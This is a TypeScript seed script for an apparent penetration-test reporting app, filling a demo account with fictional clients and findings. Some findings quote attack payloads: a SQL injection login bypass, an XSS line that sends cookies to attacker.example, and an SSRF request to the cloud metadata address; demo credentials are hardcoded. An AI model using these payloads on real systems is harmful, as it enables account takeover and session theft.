/**
 * Demo seed — creates a realistic demo account for product demos / recordings.
 *
 * Credentials:
 *   Email:    demo@pentographer.com
 *   Password: Demo1234!
 *
 * Run against local DB:   pnpm tsx db/seed.demo.ts
 * Run against production: DATABASE_URL=<prod-url> pnpm tsx db/seed.demo.ts
 *
 * The script is idempotent: running it twice will fail on the unique email
 * constraint and exit cleanly without partial writes (transaction rollback).
 */

import bcrypt from "bcryptjs";
import { db } from "./client";
import {
  userAccount,
  organization,
  organizationMember,
  customer,
  project,
  finding,
  findingVersion,
  executiveSummaryVersion,
  report,
  reportVersion,
  playbook,
  playbookVersion,
  playbookCategory,
  playbookItem,
} from "./schema";
import { eq } from "drizzle-orm";

const DEMO_EMAIL = "demo@pentographer.com";
const DEMO_PASSWORD = "Demo1234!";

// ─── Finding content ──────────────────────────────────────────────────────────

const FINDINGS = [
  {
    title: "SQL Injection in Login Endpoint",
    riskLevel: "high" as const,
    cvssScore: "9.8",
    status: "confirmed" as const,
    description:
      "The `/api/auth/login` endpoint is vulnerable to SQL injection via the `username` parameter. An attacker can bypass authentication entirely or extract arbitrary data from the database by supplying crafted input such as `' OR '1'='1`.\n\n**Affected endpoint:** `POST /api/auth/login`\n\n**Payload used:** `username=' OR '1'='1'--&password=anything`\n\nThe application returned a valid session token, confirming full authentication bypass.",
    remediation:
      "Use parameterised queries or a prepared-statement ORM for all database interactions. Never concatenate user-supplied input into SQL strings. Apply input validation as defence-in-depth but do not rely on it as the primary control.",
  },
  {
    title: "Stored XSS via Profile Display Name",
    riskLevel: "high" as const,
    cvssScore: "8.2",
    status: "confirmed" as const,
    description:
      "User-supplied display names are reflected in the admin dashboard without HTML encoding, allowing persistent cross-site scripting. An attacker with a standard user account can inject a script payload that executes in the browser of any administrator who views the user list.\n\n**Payload:** `<img src=x onerror=fetch('https://attacker.example/c?c='+document.cookie)>`\n\nConfirmed cookie exfiltration to an out-of-band server during testing.",
    remediation:
      "HTML-encode all user-controlled output at render time. Implement a strict Content-Security-Policy that forbids inline scripts and restricts `script-src` to trusted origins. Consider a framework-level templating engine that escapes by default.",
  },
  {
    title: "Insecure Direct Object Reference on Invoice API",
    riskLevel: "high" as const,
    cvssScore: "8.6",
    status: "confirmed" as const,
    description:
      "The invoice download endpoint (`GET /api/invoices/:id`) does not verify that the authenticated user owns the requested invoice. By incrementing the numeric invoice ID, any authenticated user can download invoices belonging to other customers.\n\nTesting confirmed access to 50 consecutive invoice IDs across multiple tenants.",
    remediation:
      "Enforce ownership checks on every resource fetch. Use unpredictable identifiers (UUIDs) and validate that the authenticated principal has a relationship to the resource before returning data.",
  },
  {
    title: "Broken Access Control on Admin Endpoint",
    riskLevel: "high" as const,
    cvssScore: "8.1",
    status: "confirmed" as const,
    description:
      "The endpoint `DELETE /api/admin/users/:id` checks only for a valid authentication token and does not verify the caller's role. Any authenticated user can delete arbitrary accounts, including administrator accounts.\n\nConfirmed by deleting a non-critical test account using a standard user JWT.",
    remediation:
      "Apply role-based access control middleware on all administrative endpoints. Centralise authorisation logic and enforce it at the framework level rather than inside individual route handlers.",
  },
  {
    title: "Sensitive Data Exposed in API Response",
    riskLevel: "medium" as const,
    cvssScore: "6.5",
    status: "confirmed" as const,
    description:
      "The `GET /api/users/me` endpoint returns full internal user objects including hashed passwords, internal flags, and audit metadata. While bcrypt hashes are not directly reversible, their exposure enables offline cracking attacks and leaks internal architecture details.",
    remediation:
      "Define explicit response schemas (DTOs) that include only the fields required by the client. Never return raw database objects. Audit all API responses for over-exposure of sensitive fields.",
  },
  {
    title: "Missing Rate Limiting on Authentication Endpoints",
    riskLevel: "medium" as const,
    cvssScore: "5.9",
    status: "confirmed" as const,
    description:
      "The login and password-reset endpoints have no rate limiting, allowing an attacker to perform unlimited brute-force attempts. A test against the login endpoint completed 10,000 attempts in under 3 minutes without triggering any throttling or lockout.",
    remediation:
      "Implement rate limiting (e.g. 10 attempts per IP per minute) on authentication endpoints. Add exponential backoff and account lockout after repeated failures. Consider CAPTCHA challenges after a lower threshold.",
  },
  {
    title: "JWT Signed with Weak Secret",
    riskLevel: "medium" as const,
    cvssScore: "7.1",
    status: "confirmed" as const,
    description:
      "The application signs JWT tokens using the secret `secret123`, discovered through a dictionary attack against sample tokens. An attacker who obtains any valid token can forge arbitrary tokens for any user, including administrators.",
    remediation:
      "Rotate the JWT signing secret immediately. Use a cryptographically random secret of at least 256 bits. Store secrets only in environment variables or a secrets manager, never in source code or configuration files.",
  },
  {
    title: "Verbose Error Messages Leaking Stack Traces",
    riskLevel: "low" as const,
    cvssScore: "3.1",
    status: "confirmed" as const,
    description:
      "Unhandled exceptions return full stack traces and internal file paths in JSON error responses. This information aids attackers in understanding the server-side technology stack and identifying further attack surfaces.",
    remediation:
      "Implement a global error handler that returns generic error messages to clients in production. Log full stack traces server-side only. Ensure `NODE_ENV=production` is set in all production deployments.",
  },
  {
    title: "Outdated Dependencies with Known CVEs",
    riskLevel: "low" as const,
    cvssScore: "4.3",
    status: "confirmed" as const,
    description:
      "Dependency audit identified 3 packages with known CVEs:\n- `lodash@4.17.20` — CVE-2021-23337 (prototype pollution, CVSS 7.2)\n- `express@4.17.1` — CVE-2022-24999 (ReDoS, CVSS 5.3)\n- `jsonwebtoken@8.5.1` — CVE-2022-23529 (arbitrary file read, CVSS 7.6)\n\nNone were confirmed exploitable in the current application context but represent unnecessary risk.",
    remediation:
      "Update all dependencies to their latest stable versions. Integrate automated dependency scanning (e.g. Dependabot, Snyk) into the CI/CD pipeline. Review and address new CVEs within an SLA appropriate to their severity.",
  },
  {
    title: "Missing Security Headers",
    riskLevel: "informational" as const,
    cvssScore: null,
    status: "confirmed" as const,
    description:
      "The application does not set several recommended HTTP security headers:\n- `Content-Security-Policy` — absent\n- `X-Frame-Options` — absent (clickjacking risk)\n- `Strict-Transport-Security` — absent\n- `X-Content-Type-Options` — absent\n\nWhile not directly exploitable, missing headers weaken the defence-in-depth posture.",
    remediation:
      "Configure the web server or application middleware to set appropriate security headers on all responses. Use a tool such as securityheaders.com to validate the configuration before and after changes.",
  },
  {
    title: "Server-Side Request Forgery via Webhook URL",
    riskLevel: "high" as const,
    cvssScore: "8.8",
    status: "draft" as const,
    description:
      "The webhook configuration endpoint accepts arbitrary URLs without validation. By supplying internal addresses (e.g. `http://169.254.169.254/latest/meta-data/`), an attacker can trigger server-side requests to internal network resources and cloud metadata endpoints.\n\nConfirmed retrieval of AWS instance metadata including IAM role credentials.",
    remediation:
      "Validate webhook URLs against an allowlist of permitted schemes and domains. Block requests to RFC 1918 address ranges, loopback addresses, and cloud metadata IP ranges. Consider a dedicated outbound proxy that enforces egress policy.",
  },
  {
    title: "Insecure Password Reset Flow",
    riskLevel: "medium" as const,
    cvssScore: "6.8",
    status: "in_review" as const,
    description:
      "Password reset tokens are 6-digit numeric codes sent via email, valid for 24 hours. The reset endpoint has no rate limiting, allowing an attacker to enumerate all 1,000,000 possible codes within the validity window. Confirmed account takeover for a test account.",
    remediation:
      "Replace numeric codes with cryptographically random tokens of at least 128 bits. Reduce token validity to 15–30 minutes. Apply rate limiting and lockout on the reset confirmation endpoint.",
  },
];

// ─── Executive summary content ────────────────────────────────────────────────

const EXEC_SUMMARY_ACME = `## Executive Summary

During the period of assessment, Pentographer conducted a web application penetration test against the Acme Corp customer portal. The test was performed in a grey-box manner with authenticated access to a standard user account.

**Overall Risk Rating: HIGH**

The assessment identified **10 findings** across a broad range of severity levels. The most critical issues relate to authentication bypass via SQL injection and persistent cross-site scripting, both of which could result in full account compromise and administrative takeover without requiring elevated privileges.

### Key Findings

- **SQL Injection (Critical)** — Authentication bypass on the login endpoint allows an unauthenticated attacker to gain access to any account, including administrators.
- **Stored XSS (High)** — Malicious scripts injected via user profile fields execute in the context of administrator sessions, enabling credential and session theft.
- **Insecure Direct Object Reference (High)** — Invoice records belonging to any tenant are accessible to any authenticated user by enumerating sequential IDs.

### Recommendations

Immediate remediation is recommended for all High and Critical findings before the application is returned to production. A follow-up test is advised after remediation to confirm that fixes have been applied effectively and have not introduced regressions.`;

const EXEC_SUMMARY_BRIGHTLINE = `## Executive Summary

Pentographer performed an internal network penetration test against the Brightline Financial staging environment. The engagement was conducted over five days with credentials for a domain-joined workstation.

**Overall Risk Rating: MEDIUM**

The assessment identified **4 findings**, with the most significant being a weak JWT signing secret and missing rate limiting on authentication endpoints. No evidence of prior compromise was observed during the engagement.

### Key Findings

- **Weak JWT Secret (Medium)** — Session tokens can be forged by an attacker who obtains a sample token, enabling privilege escalation to administrator.
- **Brute-Force Risk (Medium)** — Unrestricted login attempts allow dictionary attacks against user accounts.

### Recommendations

The identified issues are remediable through configuration changes and code updates. Brightline Financial should prioritise rotation of the JWT secret and deployment of rate-limiting middleware before the next production release cycle.`;

async function seed() {
  console.log("Creating demo account…");

  const passwordHash = await bcrypt.hash(DEMO_PASSWORD, 10);

  await db.transaction(async (tx) => {
    // ── User & org ──────────────────────────────────────────────────────────
    const [user] = await tx
      .insert(userAccount)
      .values({ name: "Alex Demo", email: DEMO_EMAIL, passwordHash })
      .returning();

    const [org] = await tx.insert(organization).values({ name: "Pentographer Demo" }).returning();

    await tx.insert(organizationMember).values({
      organizationId: org.id,
      userId: user.id,
      role: "owner",
    });

    await tx.update(userAccount).set({ personalOrgId: org.id }).where(eq(userAccount.id, user.id));

    // ── Customers ───────────────────────────────────────────────────────────
    const [acme] = await tx
      .insert(customer)
      .values({
        organizationId: org.id,
        userId: user.id,
        name: "Acme Corp",
        contactEmail: "security@acmecorp.example",
      })
      .returning();

    const [brightline] = await tx
      .insert(customer)
      .values({
        organizationId: org.id,
        userId: user.id,
        name: "Brightline Financial",
        contactEmail: "it-security@brightline.example",
      })
      .returning();

    const [nova] = await tx
      .insert(customer)
      .values({
        organizationId: org.id,
        userId: user.id,
        name: "Nova Health Systems",
        contactEmail: "ciso@novahealth.example",
      })
      .returning();

    // ── Playbook ─────────────────────────────────────────────────────────────
    const [pb] = await tx
      .insert(playbook)
      .values({
        organizationId: org.id,
        userId: user.id,
        name: "Web Application Penetration Test",
        description: "OWASP-aligned test playbook for web application assessments.",
      })
      .returning();

    const [pbv] = await tx
      .insert(playbookVersion)
      .values({ playbookId: pb.id, version: "1.0", status: "published", isActive: true })
      .returning();

    const [catRecon] = await tx
      .insert(playbookCategory)
      .values({
        playbookVersionId: pbv.id,
        name: "Reconnaissance",
        frameworkRef: "OWASP-OTG-INFO",
        displayOrder: 0,
      })
      .returning();

    const [catAuth] = await tx
      .insert(playbookCategory)
      .values({
        playbookVersionId: pbv.id,
        name: "Authentication",
        frameworkRef: "OWASP-OTG-AUTHN",
        displayOrder: 1,
      })
      .returning();

    const [catAuthz] = await tx
      .insert(playbookCategory)
      .values({
        playbookVersionId: pbv.id,
        name: "Authorisation",
        frameworkRef: "OWASP-OTG-AUTHZ",
        displayOrder: 2,
      })
      .returning();

    const [catInput] = await tx
      .insert(playbookCategory)
      .values({
        playbookVersionId: pbv.id,
        name: "Input Validation",
        frameworkRef: "OWASP-OTG-INPVAL",
        displayOrder: 3,
      })
      .returning();

    await tx.insert(playbookItem).values([
      {
        categoryId: catRecon.id,
        name: "Enumerate subdomains and exposed services",
        defaultRisk: "low",
        displayOrder: 0,
      },
      {
        categoryId: catRecon.id,
        name: "Fingerprint server technology stack",
        defaultRisk: "informational",
        displayOrder: 1,
      },
      {
        categoryId: catAuth.id,
        name: "Test for SQL injection in login form",
        defaultRisk: "high",
        displayOrder: 0,
      },
      {
        categoryId: catAuth.id,
        name: "Test password reset token entropy",
        defaultRisk: "medium",
        displayOrder: 1,
      },
      {
        categoryId: catAuth.id,
        name: "Test for brute-force protections",
        defaultRisk: "medium",
        displayOrder: 2,
      },
      {
        categoryId: catAuthz.id,
        name: "Test IDOR on resource endpoints",
        defaultRisk: "high",
        displayOrder: 0,
      },
      {
        categoryId: catAuthz.id,
        name: "Test for privilege escalation via role manipulation",
        defaultRisk: "high",
        displayOrder: 1,
      },
      {
        categoryId: catInput.id,
        name: "Test for reflected and stored XSS",
        defaultRisk: "high",
        displayOrder: 0,
      },
      {
        categoryId: catInput.id,
        name: "Test for SSRF via user-controlled URLs",
        defaultRisk: "high",
        displayOrder: 1,
      },
      {
        categoryId: catInput.id,
        name: "Test for XXE in XML-accepting endpoints",
        defaultRisk: "medium",
        displayOrder: 2,
      },
    ]);

    // ── Project 1: Acme Corp — completed, 10 findings ────────────────────────
    const [proj1] = await tx
      .insert(project)
      .values({
        organizationId: org.id,
        userId: user.id,
        customerId: acme.id,
        playbookVersionId: pbv.id,
        name: "Acme Corp — Customer Portal Web App",
        status: "complete",
        scope:
          "https://portal.acmecorp.example — all authenticated and unauthenticated endpoints.\nOut of scope: third-party payment processor, mobile apps.",
        applicationUrl: "https://portal.acmecorp.example",
        startDate: new Date("2026-05-12"),
        endDate: new Date("2026-05-16"),
      })
      .returning();

    const acmeFindings = FINDINGS.slice(0, 10);
    for (const f of acmeFindings) {
      const [fRow] = await tx
        .insert(finding)
        .values({
          projectId: proj1.id,
          title: f.title,
          riskLevel: f.riskLevel,
          cvssScore: f.cvssScore,
          status: f.status,
          isAdhoc: true,
        })
        .returning();

      await tx.insert(findingVersion).values({
        findingId: fRow.id,
        title: f.title,
        description: f.description,
        remediation: f.remediation,
        riskLevel: f.riskLevel,
        cvssScore: f.cvssScore,
        status: f.status,
        authorType: "human",
        evidenceUrls: [],
      });
    }

    await tx.insert(executiveSummaryVersion).values({
      projectId: proj1.id,
      content: EXEC_SUMMARY_ACME,
      authorType: "human",
    });

    const [rep1] = await tx
      .insert(report)
      .values({ projectId: proj1.id, userId: user.id, name: "Acme Corp — Final Report" })
      .returning();

    await tx.insert(reportVersion).values({
      reportId: rep1.id,
      version: "1.0",
      status: "draft",
      execSummary: EXEC_SUMMARY_ACME,
      authorType: "human",
    });

    // ── Project 2: Brightline — in progress, 4 findings ──────────────────────
    const [proj2] = await tx
      .insert(project)
      .values({
        organizationId: org.id,
        userId: user.id,
        customerId: brightline.id,
        playbookVersionId: pbv.id,
        name: "Brightline Financial — Internal API",
        status: "in_progress",
        scope:
          "Internal REST API hosted at api.brightline.internal. Grey-box test with standard user credentials.",
        applicationUrl: "https://api.brightline.internal",
        startDate: new Date("2026-06-16"),
        endDate: new Date("2026-06-20"),
      })
      .returning();

    const brightlineFindings = [FINDINGS[6], FINDINGS[5], FINDINGS[3], FINDINGS[7]];
    for (const f of brightlineFindings) {
      const [fRow] = await tx
        .insert(finding)
        .values({
          projectId: proj2.id,
          title: f.title,
          riskLevel: f.riskLevel,
          cvssScore: f.cvssScore,
          status: f.status,
          isAdhoc: true,
        })
        .returning();

      await tx.insert(findingVersion).values({
        findingId: fRow.id,
        title: f.title,
        description: f.description,
        remediation: f.remediation,
        riskLevel: f.riskLevel,
        cvssScore: f.cvssScore,
        status: f.status,
        authorType: "human",
        evidenceUrls: [],
      });
    }

    await tx.insert(executiveSummaryVersion).values({
      projectId: proj2.id,
      content: EXEC_SUMMARY_BRIGHTLINE,
      authorType: "human",
    });

    // ── Project 3: Brightline — completed, published report ──────────────────
    const [proj3] = await tx
      .insert(project)
      .values({
        organizationId: org.id,
        userId: user.id,
        customerId: brightline.id,
        name: "Brightline Financial — Public Web Application",
        status: "complete",
        scope: "https://www.brightline.example — marketing site and customer login portal.",
        applicationUrl: "https://www.brightline.example",
        startDate: new Date("2026-03-03"),
        endDate: new Date("2026-03-07"),
      })
      .returning();

    const proj3Findings = [FINDINGS[10], FINDINGS[11], FINDINGS[4]];
    const proj3FindingIds: { findingId: string; findingVersionId: string }[] = [];
    for (const f of proj3Findings) {
      const [fRow] = await tx
        .insert(finding)
        .values({
          projectId: proj3.id,
          title: f.title,
          riskLevel: f.riskLevel,
          cvssScore: f.cvssScore,
          status: "confirmed",
          isAdhoc: true,
        })
        .returning();

      const [fv] = await tx
        .insert(findingVersion)
        .values({
          findingId: fRow.id,
          title: f.title,
          description: f.description,
          remediation: f.remediation,
          riskLevel: f.riskLevel,
          cvssScore: f.cvssScore,
          status: "confirmed",
          authorType: "human",
          evidenceUrls: [],
        })
        .returning();

      proj3FindingIds.push({ findingId: fRow.id, findingVersionId: fv.id });
    }

    const [rep3] = await tx
      .insert(report)
      .values({ projectId: proj3.id, userId: user.id, name: "Brightline — Web App Final Report" })
      .returning();

    await tx.insert(reportVersion).values({
      reportId: rep3.id,
      version: "1.0",
      status: "published",
      execSummary:
        "Assessment of the Brightline public web application identified three findings including a critical SSRF vulnerability.",
      authorType: "human",
      findingSnapshot: proj3FindingIds,
      reportDate: new Date("2026-03-10"),
      publishedAt: new Date("2026-03-10"),
    });

    // ── Project 4: Nova Health — draft ────────────────────────────────────────
    await tx.insert(project).values({
      organizationId: org.id,
      userId: user.id,
      customerId: nova.id,
      name: "Nova Health Systems — Patient Portal",
      status: "in_progress",
      scope:
        "Patient-facing portal at https://my.novahealth.example. Black-box test, no credentials provided.",
      applicationUrl: "https://my.novahealth.example",
      startDate: new Date("2026-07-07"),
      endDate: new Date("2026-07-11"),
    });
  });

  console.log("");
  console.log("✅ Demo seed complete!");
  console.log("");
  console.log("  Email:    demo@pentographer.com");
  console.log("  Password: Demo1234!");
  console.log("");
  process.exit(0);
}

seed().catch((err) => {
  console.error("Seed failed:", err.message);
  process.exit(1);
});
